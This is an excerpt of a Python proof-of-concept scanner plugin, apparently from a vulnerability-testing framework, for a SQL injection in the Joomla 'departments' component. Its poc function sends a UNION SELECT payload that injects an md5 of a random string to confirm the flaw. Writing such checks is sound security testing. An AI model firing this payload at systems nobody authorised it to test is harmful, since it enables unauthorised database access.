...
def get_plugin_info():
    plugin_info = {
        ...
        "desc": "Joomla departments 存在SQL注入漏洞",
        "grade": "中",
        "type": "web",
        "keyword": "tag:Joomla"
    }
...
def poc(arg):
    ...
    try:
        r = requests.get(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/index.php?option=com_departments&id=-1%20UNION%20SELECT%201,md5({rand_str}),3,4,5,6,7,8--', 
            headers=headers,
            timeout=timeout, 
            verify=False
            )
